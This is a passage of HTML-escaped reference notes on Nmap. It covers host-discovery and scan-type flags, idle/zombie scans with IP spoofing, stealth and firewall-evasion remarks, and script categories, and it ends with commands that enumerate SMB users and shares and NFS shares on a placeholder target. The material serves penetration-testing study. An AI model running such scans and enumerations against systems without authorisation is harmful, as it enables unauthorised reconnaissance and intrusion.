1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;a href=&quot;https://nmap.org/book/man-host-discovery.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;When called as the superuser, Nmap uses ARP for local host discovery and a combination of ICMP Echo, TCP SYN to 443, TCP ACK to 80, and ICMP Timestamp requests for remote host discovery.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/p&gt;\n&lt;p&gt;When called as a normal user, Nmap has more limited options and uses &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP SYN&lt;/a&gt; packets sent for ports 80 and 443 for both local and remote host discovery.&lt;/p&gt;\n&lt;p&gt;Discovery methods:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-PA&lt;/code&gt; — Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP ACK&lt;/a&gt; packets for host discovery; otherwise the same as &lt;code&gt;-PS&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-PE&lt;/code&gt; — Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; Echo for host discovery. (Note that Nmap will still not send the echo request if host existence can be verified using the initial &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ARP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ARP&quot;&gt;ARP&lt;/a&gt; request.)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-PM&lt;/code&gt; — Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; Address Mask for host discovery. (More-or-less the same as &lt;code&gt;-PP&lt;/code&gt;, just a different &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; request type.)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-PP&lt;/code&gt; — Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; Timestamp for host discovery. (Less likely to be blocked by firewalls than &lt;code&gt;-PE&lt;/code&gt;, but also a more unusual request that may stand out. Like &lt;code&gt;-PE&lt;/code&gt;, Nmap will still not send the timestamp request if host existence can be verified using the initial &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ARP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ARP&quot;&gt;ARP&lt;/a&gt; request.)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-PR&lt;/code&gt; — Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ARP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ARP&quot;&gt;ARP&lt;/a&gt; packets only for host discovery.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-PS&lt;/code&gt; — Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP SYN&lt;/a&gt; packets for host discovery. Uses port 80 by default, or you can specify a port list (e.g., &lt;code&gt;-PS80,8080,8888&lt;/code&gt;) or range (e.g. &lt;code&gt;-PS20-30&lt;/code&gt;). (Note that unprivileged users &lt;em&gt;must&lt;/em&gt; complete a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; handshake.)&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-PU&lt;/code&gt; — Use &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; packets for host discovery. Unlike other types of host discovery scans, &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; scans only generate a reply (&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; Port Unreachable) if the target port is &lt;em&gt;closed&lt;/em&gt;.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Most of the time the default discovery options (or &lt;code&gt;-Pn&lt;/code&gt;) is fine. The above options are mostly useful for unusual networks or if there’s a need to be extra-stealthy.&lt;/p&gt;\n&lt;h3 id=&quot;scan-types&quot;&gt;Scan types&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#scan-types&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-sA&lt;/code&gt; — ACK scan. All ports &lt;em&gt;should&lt;/em&gt; respond with a RST, but firewalls will generally block these requests except for open/forwarded ports. Thus, an ACK scan is useful for probing the configuration of intermediate firewalls (but says nothing about whether services are actually &lt;em&gt;listening&lt;/em&gt; on the identified ports).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sF&lt;/code&gt; — FIN scan. Use and output is similar to a null scan, but is slightly more likely to be blocked.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sI&lt;/code&gt; — &lt;a href=&quot;https://nmap.org/book/idlescan.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Idle/Zombie scan.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; The idea here is to choose a machine with &lt;em&gt;no&lt;/em&gt; traffic on it and then spoof its IP address. Scans then consist of a SYN/ACK to the zombie to get the current IP ID value for the current port, then a SYN to the target (which should either reply with a RST to the zombie, which doesn’t trigger a response and thus doesn’t increment the IP ID, or a SYN/ACK to the zombie, which will respond with a RST which &lt;em&gt;will&lt;/em&gt; increment the IP ID), then a second SYN/ACK to the zombie to see if the IP ID has been incremented by 1 (port closed or filtered on the target) or 2 (port open on the target). Note that zombies need to be systems that increment the IP ID sequentially &lt;em&gt;and&lt;/em&gt; globally, and open/closed ports will be from the &lt;em&gt;zombie’s&lt;/em&gt; perspective, not the attacker’s. These scans are also slooooow (though not as slow as &lt;code&gt;-T0&lt;/code&gt;).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sL&lt;/code&gt; — Dummy scan. Show the hosts that would be scanned, but don’t actually do anything (except perhaps DNS resolution).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sM&lt;/code&gt; — Maimon scan (named after Uriel Maimon); the FIN and ACK &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP flags&lt;/a&gt; are set. Should always receive a RST, but some older BSD systems drop the packet on open ports. Of limited modern utility.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sn&lt;/code&gt; — Host discovery only (see the previous section for details). Note that the Windows Firewall blocks &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; by default.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sN&lt;/code&gt; — Null scan; no &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP flags&lt;/a&gt; are set. Used to circumvent &lt;em&gt;stateless&lt;/em&gt; firewalls. Can distinguish between &lt;code&gt;closed&lt;/code&gt; and &lt;code&gt;open|filtered&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sS&lt;/code&gt; — SYN scan. Most common scan, and Nmap’s default. Starts a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; handshake but then sends a RST after receiving the SYN/ACK packet. Requires root, should not be used on OT. Also called a “stealth scan”, but most IDS solutions detect it these days.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sT&lt;/code&gt;- &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; connect scan. This makes a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; handshake when connecting to each port, then sends a RST/ACK after the handshake is finished. Slow but accurate. This is the only scan available for unprivileged users.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sU&lt;/code&gt; — &lt;a href=&quot;https://nmap.org/book/scan-methods-udp-scan.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;UDP scan.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; Sends empty &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; packets (or more realistic packets for known ports) and listens for a response back (“open”) or a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/ICMP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/ICMP&quot;&gt;ICMP&lt;/a&gt; “port unreachable” packet (“closed”). Since &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; doesn’t require a response, most ports will get marked &lt;code&gt;open|filtered&lt;/code&gt;. Can be specified with one of the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; scans to scan &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; and &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; ports simultaneously. &lt;em&gt;Very&lt;/em&gt; slow, so you probably want to use with &lt;code&gt;-sU --top-ports 20&lt;/code&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sW&lt;/code&gt; — &lt;a href=&quot;https://nmap.org/book/scan-methods-window-scan.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;TCP window scan.&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; The same as an ACK scan except that it examines the &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-window-size&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-window-size&quot;&gt;TCP window&lt;/a&gt; field of returned RST packets and uses it to discern if a port responded &lt;em&gt;differently&lt;/em&gt;. Note that ports may be reported as closed (and open!) erroneously (as not all systems respond in the same way), but unfiltered ports will be identified. Look for patterns of open/closed ports to try to discern how the target system is responding.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-sX&lt;/code&gt; — Xmas scan; the FIN, URG, and PSH &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-header-flags&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-header-flags&quot;&gt;TCP flags&lt;/a&gt; are set. Use and output is similar to a null scan.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;Note that Nmap by default uses a &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP-window-size&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP-window-size&quot;&gt;TCP window&lt;/a&gt; of 1024 bytes and an MSS of 1460. This is actually an unusual combination, and makes most Nmap &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; scans stick out in packet captures. The exception to this is a full &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; connect scan, which uses the system &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/TCP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/TCP&quot;&gt;TCP&lt;/a&gt; stack and thus tends to have more sensible options.&lt;/p&gt;\n&lt;h3 id=&quot;output&quot;&gt;Output&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#output&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;-oA&lt;/code&gt; — Save the results in “normal”, “grepable”, and XML formats simultaneously. This option will automatically append meaningful extensions (the other options do not do this).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-oG&lt;/code&gt; — Save the results as “grepable” output. This is a compact format meant to automatically provide context when searched with &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/grep&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/grep&quot;&gt;grep&lt;/a&gt;.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-oN&lt;/code&gt; — Save results as “normal” output. This is more-or-less what Nmap will print to STDOUT.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;-oX&lt;/code&gt; — Save the results as XML, designed to be importable by other applications.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;port-states&quot;&gt;Port states&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#port-states&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;ul&gt;\n&lt;li&gt;&lt;code&gt;Open&lt;/code&gt; — The port is reachable and there is a service listening on it.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Closed&lt;/code&gt; — The port is reachable and there is no service listening on it.&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Filtered&lt;/code&gt; — Nmap cannot determine the port state because the port is not accessible (probably because of a firewall).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Unfiltered&lt;/code&gt; — Nmap cannot determine the port state, but the port &lt;em&gt;is&lt;/em&gt; accessible (only encountered in ACK scans).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Open|Filtered&lt;/code&gt; — Nmap can only determine that the port is not closed (only encountered in &lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/UDP&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/UDP&quot;&gt;UDP&lt;/a&gt; scans and more exotic scans like Xmas).&lt;/li&gt;\n&lt;li&gt;&lt;code&gt;Closed|Filtered&lt;/code&gt; — Nmap can only determine that the port is not open (only encountered in IP ID idle scans).&lt;/li&gt;\n&lt;/ul&gt;\n&lt;h2 id=&quot;scripting-engine&quot;&gt;Scripting engine&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#scripting-engine&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;p&gt;&lt;a href=&quot;https://nmap.org/book/nse-usage.html&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;Nmap scripting engine&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; categories:&lt;/p&gt;\n&lt;ul&gt;\n&lt;li&gt;auth — Probes for information about service authentication and bypasses. Does not conduct brute-force attacks.&lt;/li&gt;\n&lt;li&gt;broadcast — Host/network probes using broadcast packets.&lt;/li&gt;\n&lt;li&gt;brute — Attempt to brute-force service credentials.&lt;/li&gt;\n&lt;li&gt;default — A curated list of fast, reliable scripts. Can also be called using -sC.&lt;/li&gt;\n&lt;li&gt;discovery — Gather additional information about scanned machines/ports.&lt;/li&gt;\n&lt;li&gt;dos — Scripts that may crash machines/services.&lt;/li&gt;\n&lt;li&gt;exploit — Attempt to actually exploit identified services.&lt;/li&gt;\n&lt;li&gt;external — Scripts that send data to third-party services.&lt;/li&gt;\n&lt;li&gt;fuzzer — Fuzz identified services.&lt;/li&gt;\n&lt;li&gt;intrusive — Scripts that may crash a service, generate lots of log messages, or are otherwise noise / may be considered malicious.&lt;/li&gt;\n&lt;li&gt;malware — Test for the possible presence of malware on the target.&lt;/li&gt;\n&lt;li&gt;safe — The opposite of “intrusive”: scripts that are unlikely to be noisy or perceived as malicious (no guarantees though).&lt;/li&gt;\n&lt;li&gt;version — Scripts called by -sV. Unlike “default”, this category cannot be called directly.&lt;/li&gt;\n&lt;li&gt;vuln — Check for potential vulnerabilities. I’ve found that scripts in this category generate a lot of false positives.&lt;/li&gt;\n&lt;/ul&gt;\n&lt;p&gt;You can also run your own scripts.&lt;/p&gt;\n&lt;h2 id=&quot;targeted-reconnaissance&quot;&gt;Targeted reconnaissance&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#targeted-reconnaissance&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h2&gt;\n&lt;h3 id=&quot;cifs&quot;&gt;CIFS&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#cifs&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;Typical Nmap portscan output for CIFS:&lt;/p&gt;\n&lt;pre&gt;&lt;code&gt;PORT    STATE SERVICE      REASON\n139/tcp open  netbios-ssn  syn-ack\n445/tcp open  microsoft-ds syn-ack\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;a href=&quot;https://www.infosecademy.com/nmap-smb-scripts-enumeration/&quot; class=&quot;external&quot; target=&quot;_blank&quot;&gt;CIFS users and shares can be enumerated&lt;svg aria-hidden=&quot;true&quot; class=&quot;external-icon&quot; style=&quot;max-width:0.8em;max-height:0.8em&quot; viewBox=&quot;0 0 512 512&quot;&gt;&lt;path d=&quot;M320 0H288V64h32 82.7L201.4 265.4 178.7 288 224 333.3l22.6-22.6L448 109.3V192v32h64V192 32 0H480 320zM32 32H0V64 480v32H32 456h32V480 352 320H424v32 96H64V96h96 32V32H160 32z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt; by Nmap during scanning:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -vv&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     --script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; smb-enum-shares.nse,smb-enum-users.nse&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -p445&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; $TARGET_IP&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;\n&lt;blockquote class=&quot;callout tip&quot; data-callout=&quot;tip&quot;&gt;\n&lt;div class=&quot;callout-title&quot;&gt;\n                  &lt;div class=&quot;callout-icon&quot;&gt;&lt;/div&gt;\n                  &lt;div class=&quot;callout-title-inner&quot;&gt;&lt;p&gt;Tip&lt;/p&gt;&lt;/div&gt;\n                  \n                &lt;/div&gt;\n&lt;div class=&quot;callout-content&quot;&gt;\n&lt;div class=&quot;callout-content-inner&quot;&gt;\n&lt;p&gt;While smb-enum-shares.nse returns results for UNIX-like systems, I’ve found smb-enum-users.nse to be kind of hit-or-miss.&lt;/p&gt;\n&lt;/div&gt;\n&lt;/div&gt;\n&lt;/blockquote&gt;\n&lt;h3 id=&quot;nfs&quot;&gt;NFS&lt;a role=&quot;anchor&quot; aria-hidden tabindex=&quot;-1&quot; data-no-popover href=&quot;#nfs&quot; class=&quot;internal&quot;&gt;&lt;svg width=&quot;18&quot; height=&quot;18&quot; viewBox=&quot;0 0 24 24&quot; fill=&quot;none&quot; stroke=&quot;currentColor&quot; stroke-width=&quot;2&quot; stroke-linecap=&quot;round&quot; stroke-linejoin=&quot;round&quot;&gt;&lt;path d=&quot;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&quot;&gt;&lt;/path&gt;&lt;path d=&quot;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;&lt;/h3&gt;\n&lt;p&gt;&lt;a href=&quot;https://cardboard-iguana.com/grimoire/spells/NFS&quot; class=&quot;internal alias&quot; data-slug=&quot;spells/NFS&quot;&gt;NFS&lt;/a&gt; shares can be enumerated by Nmap during scanning:&lt;/p&gt;\n&lt;figure data-rehype-pretty-code-figure=&quot;&quot;&gt;&lt;pre tabindex=&quot;0&quot; data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot;&gt;&lt;code data-language=&quot;bash&quot; data-theme=&quot;vitesse-light vitesse-dark&quot; style=&quot;display: grid;&quot;&gt;&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#59873A;--shiki-dark:#80A665&quot;&gt;nmap&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -v&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; -sT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; --script&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt; nfs-ls,nfs-statfs,nfs-showmount&lt;/span&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt; \\&lt;/span&gt;&lt;/span&gt;\n&lt;span data-line=&quot;&quot;&gt;&lt;span style=&quot;--shiki-light:#A65E2B;--shiki-dark:#C99076&quot;&gt;     -p&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B56959;--shiki-dark:#C98A7D&quot;&gt;$PORT&lt;/span&gt;&lt;span style=&quot;--shiki-light:#B07D48;--shiki-dark:#BD976A&quot;&gt; 